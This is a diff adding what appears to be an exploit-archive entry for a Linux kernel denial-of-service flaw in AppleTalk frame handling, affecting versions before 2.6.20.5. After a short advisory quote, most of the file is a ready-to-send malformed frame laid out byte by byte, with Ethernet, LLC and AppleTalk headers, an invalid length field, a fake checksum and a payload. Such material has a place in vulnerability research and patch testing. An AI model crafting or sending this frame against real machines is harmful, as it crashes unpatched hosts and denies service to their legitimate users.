@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/23376/info
+
+The Linux kernel is prone to a denial-of-service vulnerability. This issue presents itself when malformed AppleTalk frames are processed.
+
+An attacker can exploit this issue to crash host computers, effectively denying service to legitimate users.
+
+Versions prior to 2.6.20.5 are vulnerable. 
+
+{
+# Ethernet header -----
+
+XX XX XX XX XX XX # Destination MAC
+00 00 00 00 00 00 # Source MAC
+00 1D # Length
+
+# LLC header -----
+
+AA AA 03
+08 00 07 80 9B # Appletalk
+
+# Appletalk header -----
+
+00 1B # Packet length (invalid)
+00 01 # Fake checksum
+00 00 00 00 # Destination and source networks
+00 00 00 00 # Destination and source nodes and ports
+
+# Payload -----
+
+0C 0D 0E 0F 10 11 12 13
+14
+} 
